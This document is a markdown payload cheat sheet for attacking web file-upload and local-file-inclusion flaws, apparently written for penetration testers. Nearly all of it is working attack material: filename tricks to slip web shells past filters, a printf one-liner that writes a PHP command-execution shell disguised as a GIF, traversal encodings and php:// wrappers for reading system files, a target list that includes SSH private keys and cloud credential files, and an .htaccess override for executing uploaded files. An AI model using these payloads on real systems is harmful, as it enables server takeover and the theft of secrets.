# File Upload / LFI Payload Reference

## Upload filename variants

```text
shell.php  shell.PhP  shell.phtml  shell.phar  shell.pgif
shell.php.jpg  shell.jpg.php  shell.php.jpg.png
shell.php.  shell.php..  shell.php...  shell.php%20  shell.php%0a
shell.php%00.jpg  shell.php\x00.jpg
shell.php:.jpg  shell.asp;.jpg  shell.aspx::.jpg
.cer .asa .shtml .htaccess .user.ini(Linux php fastcgi)
```

## Magic-byte prefixes

```text
GIF89a            (GIF)
\xff\xd8\xff\xe0  (JPEG)
\x89PNG\r\n\x1a\n (PNG)
%PDF-1.4          (PDF)
PK\x03\x04        (ZIP/docx/xlsx/jar)
```

Combined example:

```bash
printf 'GIF89a<?php echo shell_exec($_GET["c"]);?>' > sh.gif
```

## MIME types to cycle

```text
image/png image/jpeg image/gif application/pdf
application/octet-stream (sometimes the ONLY accepted type)
```

## LFI traversal encodings

```text
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc/passwd
%2e%2e%2f%2e%2e%2f
..%252f..%252f
....\/....\/ (IIS backslash)
/var/www/images/../../etc/passwd  (absolute base escape)
php://filter/convert.base64-encode/resource=/etc/passwd
php://filter/zlib.deflate/resource=/etc/passwd
data://text/plain;base64,<b64>    (allow_url_include On)
```

## Interesting files quick list

```text
Linux:  /etc/passwd /etc/hostname /proc/self/environ /proc/self/cmdline
        ~/.ssh/id_rsa ~/.bash_history /var/log/apache2/access.log
PHP:    /var/log/php-fpm/www-error.log /tmp/sess_<SID>
Java:   /WEB-INF/web.xml /META-INF/MANIFEST.MF /META-INF/context.xml
Node:   package.json .env /proc/1/cmdline (entrypoint reveals framework)
Win:    C:\Windows\win.ini C:\inetpub\wwwroot\web.config
Cloud:  /home/user/.aws/credentials (REDACT in report — prove existence only)
```

## htaccess takeover snippet (when .htaccess upload lands in served dir)

```apache
AddType application/x-httpd-php .abc
```
Then request shell.abc — proves full control without needing PHP ext.
